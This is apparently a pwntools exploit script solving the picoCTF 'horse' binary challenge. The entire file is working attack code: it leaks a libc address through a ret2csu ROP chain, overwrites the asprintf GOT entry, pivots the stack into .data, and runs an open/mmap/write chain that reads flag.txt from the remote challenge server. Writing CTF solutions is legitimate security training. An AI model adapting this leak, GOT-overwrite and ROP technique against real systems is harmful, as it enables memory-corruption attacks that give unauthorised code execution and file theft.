from pwn import *

context.arch = 'amd64'
context.os = 'linux'

r = remote('mars.picoctf.net', 31809)
elf = ELF('./horse')
got_read = elf.got['read']
got_write = elf.got['write']

csu_pop = 0x400bfa 
csu_call = 0x400be0
ret_gadget = 0x400c04
main_skip_setup = 0x400b6f

def leak_read():
    # rbp = 0x602000 (.data start)
    safe_rbp = 0x602000
    
    payload = b'A' * 32
    payload += b'B' * 8 
    
    # Leak
    payload += p64(csu_pop)
    payload += p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_read) + p64(8)
    payload += p64(csu_call)
    payload += b'J' * 8 
    
    # Return to main_skip_setup with rbp=0x602000
    payload += p64(csu_pop)
    payload += p64(0) + p64(safe_rbp) + p64(0) * 4 
    payload += p64(main_skip_setup) 

    log.info("Sending Chain payload...")
    r.sendline(payload)
    
    r.recvuntil(b'/     /   \xc2\xb4\n')
    try:
        leaked_data = r.recvn(8)
        leaked_read = u64(leaked_data)
        log.success(f"Leaked read@GLIBC: {hex(leaked_read)}")
        return leaked_read
    except Exception as e:
        log.error(f"Failed to receive leak: {e}")
        exit()

leaked_read = leak_read()

# Offsets
off_read_9 = 0x110fa0
off_open_9 = 0x110cc0
off_write_9 = 0x111040
off_mmap_9 = 0x11b890
off_pop_rdi_9 = 0x26b72
off_pop_rsi_9 = 0x27529
off_pop_rdx_9 = 0x11c1e1
off_pop_rcx_9 = 0x9f822
off_mov_r8_rax_9 = 0x156108

shift = 0x190

addr_open = leaked_read - off_read_9 + off_open_9
addr_write = leaked_read - off_read_9 + off_write_9
addr_mmap = leaked_read - off_read_9 + off_mmap_9
addr_read = leaked_read

gadget_pop_rdi = leaked_read - off_read_9 - shift + off_pop_rdi_9
gadget_pop_rsi = leaked_read - off_read_9 - shift + off_pop_rsi_9
gadget_pop_rcx = leaked_read - off_read_9 - shift + off_pop_rcx_9
gadget_pop_rdx = leaked_read - off_read_9 + off_pop_rdx_9 # Shifted
gadget_mov_r8_rax = leaked_read - off_read_9 + off_mov_r8_rax_9 # Shifted

# Payload 2
# Buffer at 0x602000 - 0x20 = 0x601fe0.
# Bytes 0-7: Overwrite got_asprintf (at 0x601fe0).
# Bytes 40+: ROP start.

payload2 = p64(ret_gadget) # 0-7 (asprintf -> ret)
payload2 += b'P' * 32      # 8-39 (Padding)
# 40: First ROP gadget address.
# wait, leave -> rsp=0x602000. pop rbp (rsp=0x602008). ret (rsp=0x602010).
# ret pops from 0x602008.
# 0x602008 is offset 40 (0x28).
# So offset 40 is First Gadget.

flag_str_loc = 0x602000 + 0x100 # Safe loc in data/bss

# ROP
# 1. read flag string to loc
payload2 += p64(gadget_pop_rdi) + p64(0)
payload2 += p64(gadget_pop_rsi) + p64(flag_str_loc)
payload2 += p64(gadget_pop_rdx) + p64(100) + p64(0) 
payload2 += p64(addr_read)

# 2. open
payload2 += p64(gadget_pop_rdi) + p64(flag_str_loc)
payload2 += p64(gadget_pop_rsi) + p64(0)
payload2 += p64(addr_open)

# 3. mov r8
payload2 += p64(gadget_mov_r8_rax) + p64(0)

# 4. mmap
payload2 += p64(gadget_pop_rdi) + p64(0x603000)
payload2 += p64(gadget_pop_rsi) + p64(0x100)
payload2 += p64(gadget_pop_rdx) + p64(3) + p64(0)
payload2 += p64(gadget_pop_rcx) + p64(0x12) + p64(0)
payload2 += p64(addr_mmap)

# 5. write
payload2 += p64(gadget_pop_rdi) + p64(1)
payload2 += p64(gadget_pop_rsi) + p64(0x603000)
payload2 += p64(gadget_pop_rdx) + p64(0x100) + p64(0)
payload2 += p64(addr_write)

log.info("Sending Stage 2 payload...")
r.sendline(payload2)

# Horse runs (asprintf -> ret).
# Returns to main.
# Main returns.
# Pivot executes.
# read() executes.
# We send flag string.
time.sleep(0.5)
r.sendline(b'flag.txt\x00')

r.interactive()
